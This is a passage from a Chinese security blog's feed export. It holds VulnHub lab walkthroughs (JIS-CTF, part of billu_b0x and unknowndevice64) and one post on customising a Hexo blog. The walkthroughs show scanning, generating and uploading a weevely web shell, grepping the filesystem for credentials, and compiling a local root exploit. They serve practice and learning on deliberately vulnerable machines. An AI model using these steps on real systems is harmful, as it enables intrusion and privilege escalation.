class="line">chmod 777 37292.c #赋权</span><br><span class="line">gcc 37292.c -o test #编译</span><br></pre></td></tr></table></figure></p><p>执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/tmp$ ./test</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/16/5cb5b77f129ee.png" alt="11.png"></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：拿到root权限(提示从web应用入手)&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/billu-b0x,188/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/billu-b0x,188/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对于JIS-CTF-Vuln的测试</title>
    <link href="http://www.lanbainan.cn/2019/04/15/2019-04-15/"/>
    <id>http://www.lanbainan.cn/2019/04/15/2019-04-15/</id>
    <published>2019-04-14T16:38:00.000Z</published>
    <updated>2019-04-16T11:09:49.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>主机NET模式<br>实验目的：获得root权限，获取flag（共有五个flag）<br>项目地址：<a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a><br><a id="more"></a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb53c7e38565.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v 192.168.67.23</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)</span><br><span class="line">|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)</span><br><span class="line">|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 8 disallowed entries</span><br><span class="line">| / /backup /admin /admin_area /r00t /uploads</span><br><span class="line">|_/uploaded_files /flag</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-title: Sign-Up/Login Form</span><br><span class="line">|_Requested resource was login.php</span><br></pre></td></tr></table></figure></p><p>开放80、22端口<br>访问<code>http://192.168.67.23/login.php</code><br><img src="https://i.loli.net/2019/04/16/5cb53da1bbbdf.png" alt="2.png"></p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.67.23</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb5413246a1d.png" alt="4.png"><br>爆破出一个flag地址<br><img src="https://i.loli.net/2019/04/16/5cb53f6b87c14.png" alt="4.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>当访问<code>http://192.168.67.23/admin_area/</code><br><img src="https://i.loli.net/2019/04/16/5cb54209eb90e.png" alt="5.png"><br>得到一个用户和密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br><span class="line">The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>前面提到登录界面，登录试试<br><img src="https://i.loli.net/2019/04/16/5cb542fa8c8d4.png" alt="6.png"><br>看样子是要上传一句话了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# weevely generate shell /root/Desktop/shell.php #生成木马</span><br></pre></td></tr></table></figure></p><p>直接上传无任何过滤，在左上角显示<code>Success</code><br>在robots.txt中看见<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /uploads #上传目录</span><br><span class="line">Disallow: /uploaded_files #储存目录</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# weevely http://192.168.67.23/uploaded_files/shell.php shell #连接shell</span><br></pre></td></tr></table></figure><h3 id="flag3-1"><a href="#flag3-1" class="headerlink" title="flag3"></a>flag3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/var/www/html $ ls</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/16/5cb55ba374c53.png" alt="7.png"><br>flag.txt无法查看权限不够<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/var/www/html $ cat hint.txt</span><br><span class="line">try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br></pre></td></tr></table></figure></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>提示我们查找<strong>用户technawi</strong>，来获取flag.txt，并提到在隐藏文件中。我第一时间进入<code>/home/technawi</code>，但是什么都没有，排除系统用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -r &apos;technawi&apos; / #查找含有technawi的文件</span><br><span class="line">/etc/mysql/conf.d/credentials.txt:username : technawi</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Jordaninfosec-CTF01:/etc/mysql/conf.d $ cat credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>获得一个用户和密码，前面提到ssh，登录试试<br><img src="https://i.loli.net/2019/04/16/5cb5626becd70.png" alt="8.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>巧的是就是technawi的密码</p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;实战测试&quot;&gt;&lt;a href=&quot;#实战测试&quot; class=&quot;headerlink&quot; title=&quot;实战测试&quot;&gt;&lt;/a&gt;实战测试&lt;/h2&gt;&lt;p&gt;主机NET模式&lt;br&gt;实验目的：获得root权限，获取flag（共有五个flag）&lt;br&gt;项目地址：&lt;a href=&quot;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>HEXO持续优化</title>
    <link href="http://www.lanbainan.cn/2019/04/13/2019-04-13/"/>
    <id>http://www.lanbainan.cn/2019/04/13/2019-04-13/</id>
    <published>2019-04-12T17:17:00.000Z</published>
    <updated>2019-05-30T04:58:58.823Z</updated>
    
    <content type="html"><![CDATA[<h1 id="可爱的看板娘"><a href="#可爱的看板娘" class="headerlink" title="可爱的看板娘"></a>可爱的看板娘</h1><p>官方的live2d已经满足不了我的跳动的心了，偶然间看见别人的live2d贼炫酷，我也去搞来试一试。<br>由<a href="https://github.com/stevenjoezhang/live2d-widget" target="_blank" rel="noopener">张书樵的项目</a>而来<br><a id="more"></a><br><img src="https://i.loli.net/2019/04/12/5cb0459224f2c.png" alt="1.png"></p><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p>将项目下载到<code>spfk/source/</code>目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/stevenjoezhang/live2d-widget</span><br></pre></td></tr></table></figure></p><p>修改部分代码<br><code>vim live2d-widget/autoload.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const live2d_path = &quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/&quot;; #删除</span><br><span class="line">为const live2d_path = &quot;/live2d-widget/&quot;; #添加</span><br></pre></td></tr></table></figure></p><p><code>vim layout/layout.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--看板娘--&gt;</span><br><span class="line">&lt;script src=&quot;/live2d-widget/autoload.js&quot;&gt;&lt;/script&gt; #添加</span><br></pre></td></tr></table></figure></p><p><code>vim live2d-widget/waifu.css</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#waifu &#123;</span><br><span class="line">        position:fixed;</span><br><span class="line">        right:30px;</span><br><span class="line">        bottom:0;</span><br><span class="line">        z-index:1;</span><br><span class="line">        line-height:0;</span><br><span class="line">        transition:transform .3s ease-in-out;</span><br><span class="line">        transform:translateY(3px)</span><br><span class="line">&#125;</span><br><span class="line">#waifu:hover &#123;</span><br><span class="line">        -webkit-transform:translateY(0);</span><br><span class="line">        transform:translateY(0)</span><br><span class="line">&#125;</span><br><span class="line">@media (max-width:768px) &#123;</span><br><span class="line">        #waifu &#123;</span><br><span class="line">        display:none</span><br><span class="line">&#125;</span><br><span class="line">&#125;#waifu-tips &#123;</span><br><span class="line">        opacity:0;</span><br><span class="line">        margin:-20px 20px;</span><br><span class="line">        padding:5px 10px;</span><br><span class="line">        padding:5px 10px;</span><br><span class="line">        border:1px solid rgba(224,186,140,.62);</span><br><span class="line">        border-radius:12px;</span><br><span class="line">        background-color:rgba(236,217,188,.5);</span><br><span class="line">        box-shadow:0 3px 15px 2px rgba(191,158,118,.2);</span><br><span class="line">        font-size:14px;</span><br><span class="line">        line-height:24px;</span><br><span class="line">        color:#DDDDDD;</span><br><span class="line">        word-break:break-all;</span><br><span class="line">        text-overflow:ellipsis;</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:absolute;</span><br><span class="line">        animation-delay:5s;</span><br><span class="line">        animation-duration:50s;</span><br><span class="line">        animation-iteration-count:infinite;</span><br><span class="line">        animation-name:shake;</span><br><span class="line">        animation-timing-function:ease-in-out</span><br><span class="line">&#125;</span><br><span class="line">#waifu #live2d &#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        cursor:grab;</span><br><span class="line">        cursor:-webkit-grab;</span><br><span class="line">&#125;</span><br><span class="line">&#125;#waifu-tips &#123;</span><br><span class="line">        opacity:0;</span><br><span class="line">        margin:-20px 20px;</span><br><span class="line">        padding:5px 10px;</span><br><span class="line">        padding:5px 10px;</span><br><span class="line">        border:1px solid rgba(224,186,140,.62);</span><br><span class="line">        border-radius:12px;</span><br><span class="line">        background-color:rgba(236,217,188,.5);</span><br><span class="line">        box-shadow:0 3px 15px 2px rgba(191,158,118,.2);</span><br><span class="line">        font-size:14px;</span><br><span class="line">        line-height:24px;</span><br><span class="line">        color:#DDDDDD;</span><br><span class="line">        word-break:break-all;</span><br><span class="line">        text-overflow:ellipsis;</span><br><span class="line">        overflow:hidden;</span><br><span class="line">        position:absolute;</span><br><span class="line">        animation-delay:5s;</span><br><span class="line">        animation-duration:50s;</span><br><span class="line">        animation-iteration-count:infinite;</span><br><span class="line">        animation-name:shake;</span><br><span class="line">        animation-timing-function:ease-in-out</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改看板娘大小、位置、格式、文本内容等，可查看并修改 waifu-tips.js 、 waifu-tips.json 和 waifu.css。更多配置可以参考我的<a href="https://github.com/lanbainan" target="_blank" rel="noopener">GitHub</a></p><h1 id="Valine评论系统"><a href="#Valine评论系统" class="headerlink" title="Valine评论系统"></a>Valine评论系统</h1><h2 id="教程-1"><a href="#教程-1" class="headerlink" title="教程"></a>教程</h2><p>编辑主题配置文件<code>_config.yml</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">youyan:</span><br><span class="line">  #on: true</span><br><span class="line">  id:</span><br><span class="line">  # 是否开启友言评论，http://www.uyan.cc/index.php</span><br><span class="line">  # id 中填写你的友言用户数字ID，注册后进入后台管理即可查看</span><br><span class="line">  # 友言服务在 Web 环境下运行，普通本地环境无法查看，请部署后在线上测试。</span><br><span class="line"></span><br><span class="line">valine:</span><br><span class="line">  #on: true # 如果要使用Valine，请设置on: true</span><br><span class="line">  appId:  #your leancloud appId</span><br><span class="line">  appKey:  #your leancloud appKey</span><br><span class="line">  guest_info: nick,mail,link #valine comment header info</span><br><span class="line">  placeholder: Just go go # valine comment input placeholder(like: Please leave your footprints )</span><br><span class="line">  avatar: mm # gravatar style https://valine.js.org/avatar</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  verify: false # valine verify code (true/false)</span><br><span class="line">  notify: false # valine mail notify (true/false) </span><br><span class="line">  lang: zh-cn</span><br><span class="line"></span><br><span class="line"># &gt;&gt;&gt; Style Customisation 样式自定义 &lt;&lt;&lt;</span><br></pre></td></tr></table></figure></p><p><code>layout/_partial/after-footer.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%- js(&apos;//cdn.bootcss.com/jquery/1.11.1/jquery.min.js&apos;) %&gt;</span><br><span class="line">&lt;%- js(&apos;js/main&apos;) %&gt;</span><br><span class="line">&lt;%- partial(&apos;background&apos;) %&gt;</span><br><span class="line">&lt;%- partial(&apos;analytics/google-analytics&apos;) %&gt;</span><br><span class="line">&lt;%- partial(&apos;analytics/baidu-analytics&apos;) %&gt;</span><br></pre></td></tr></table></figure></p><p><code>layout/_partial/article.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/zepto/1.2.0/zepto.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">···········································································</span><br><span class="line">        &lt;%- partial(&apos;comments/disqus&apos;, &#123;</span><br><span class="line">            shortname: config.disqus_shortname</span><br><span class="line">          &#125;) %&gt;</span><br><span class="line">    &lt;% &#125; else if (theme.valine.on) &#123; %&gt;</span><br><span class="line">      &lt;%- partial(&apos;comments/valine&apos;) %&gt;</span><br><span class="line">    &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure></p><p><code>layout/_partial/comments/valine.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;section id=&quot;comments&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;valine_thread&quot; style=&quot;margin: 30px;&quot;&gt;&lt;/div&gt;</span><br><span class="line">        &lt;script src=&quot;//cdn1.lncld.net/static/js/3.0.4/av-min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=&quot;//unpkg.com/valine/dist/Valine.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            var GUEST_INFO = [&apos;nick&apos;,&apos;mail&apos;,&apos;link&apos;];</span><br><span class="line">            var guest_info = &apos;&lt;%= theme.valine.guest_info %&gt;&apos;.split(&apos;,&apos;).filter(function(item)&#123;</span><br><span class="line">                return GUEST_INFO.indexOf(item) &gt; -1</span><br><span class="line">            &#125;);</span><br><span class="line">            var notify = &apos;&lt;%= theme.valine.notify %&gt;&apos; == true;</span><br><span class="line">            var verify = &apos;&lt;%= theme.valine.verify %&gt;&apos; == true;</span><br><span class="line">            var valine = new Valine();</span><br><span class="line">            valine.init(&#123;</span><br><span class="line">                el: &apos;#valine_thread&apos;,</span><br><span class="line">                notify: notify,</span><br><span class="line">                verify: verify,</span><br><span class="line">                appId: &quot;&lt;%= theme.valine.appId %&gt;&quot;,</span><br><span class="line">                appKey: &quot;&lt;%= theme.valine.appKey %&gt;&quot;,</span><br><span class="line">                placeholder: &quot;&lt;%= theme.valine.placeholder %&gt;&quot;,</span><br><span class="line">                pageSize:&apos;&lt;%= theme.valine.pageSize %&gt;&apos;,</span><br><span class="line">                avatar:&apos;&lt;%= theme.valine.avatar %&gt;&apos;,</span><br><span class="line">                lang:&apos;&lt;%= theme.valine.lang %&gt;&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure></p><p><code>layout/_partial/share/showshare.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;/defs&gt;</span><br><span class="line">    &lt;/svg&gt;</span><br><span class="line">    &lt;!-- 推荐开源CDN来选取需引用的外部JS //--&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/jquery/1.11.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/TweenMax.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/TweenMax.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure></p><p><code>layout/_partial/toc.ejs</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;tocButton&quot; value=&quot;隐藏目录&quot;  title=&quot;点击按钮隐藏或者显示文章目录&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;%- js(&apos;//cdn.bootcss.com/jquery/1.11.1/jquery.min.js&apos;) %&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var valueHide = &quot;隐藏目录&quot;;</span><br><span class="line">    var valueShow = &quot;显示目录&quot;;</span><br></pre></td></tr></table></figure></p><p>效果图<br><img src="https://i.loli.net/2019/05/30/5cef629cb4c3f75183.png" alt="2.png"></p><h1 id="等待更新"><a href="#等待更新" class="headerlink" title="等待更新"></a>等待更新</h1><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;可爱的看板娘&quot;&gt;&lt;a href=&quot;#可爱的看板娘&quot; class=&quot;headerlink&quot; title=&quot;可爱的看板娘&quot;&gt;&lt;/a&gt;可爱的看板娘&lt;/h1&gt;&lt;p&gt;官方的live2d已经满足不了我的跳动的心了，偶然间看见别人的live2d贼炫酷，我也去搞来试一试。&lt;br&gt;由&lt;a href=&quot;https://github.com/stevenjoezhang/live2d-widget&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;张书樵的项目&lt;/a&gt;而来&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="hexo" scheme="http://www.lanbainan.cn/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>对于unknowndevice64的测试</title>
    <link href="http://www.lanbainan.cn/2019/04/12/2019-04-12/"/>
    <id>http://www.lanbainan.cn/2019/04/12/2019-04-12/</id>
    <published>2019-04-11T16:21:00.000Z</published>
    <updated>2019-04-12T00:31:35.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h2><p>主机NET模式<br>实验目的：获得root权限，查看/root/flag.txt<br>项目地址：<a href="https://www.vulnhub.com/entry/unknowndevice64-1,293/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/unknowndevice64-1,293/</a><br><a id="more"></a></p><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/11/5caefc0c0affc.png" alt="1.png"><br>先扫描开放端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# masscan -p 0-65535 192.168.67.135 --rate 1000</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 31337/tcp on 192.168.67.135</span><br><span class="line">Discovered open port 1337/tcp on 192.168.67.135</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# nmap -p1337,31337 -T4 -A -v 192.168.67.135</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">1337/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:af:04:6d:f1:8c:59:3a:d6:e1:96:b7:f7:fc:57:83 (RSA)</span><br><span class="line">|   256 12:68:4c:6b:96:1e:51:59:32:8a:3d:41:0d:55:6b:d2 (ECDSA)</span><br><span class="line">|_  256 da:3e:28:52:30:72:7a:dd:c3:fb:89:7e:54:f4:bb:fb (ED25519)</span><br><span class="line">31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.14</span><br><span class="line">|_http-title:    Website By Unknowndevice64</span><br></pre></td></tr></table></figure><p>Python版HTTP服务器</p><h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><p><img src="https://i.loli.net/2019/04/11/5caefff651120.png" alt="2.png"><br>出现提示<code>h1dd3n</code>,可能是密码之类的<br>源代码搜索key出现：（一般是key、flag、password、ctf）<br><img src="https://i.loli.net/2019/04/11/5caf010e8da6f.png" alt="3.png"><br>打开看看试试<br><img src="https://i.loli.net/2019/04/11/5caf05810cc43.png" alt="4.png"><br>“隐藏的秘密”,提示很明显了。下载下来，关于图片<a href="https://blog.csdn.net/a_small_rabbit/article/details/79644078" target="_blank" rel="noopener">隐写术</a><br>从文件大小看一般不会藏有文件，使用<a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571" target="_blank" rel="noopener">Steghide</a>提取信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 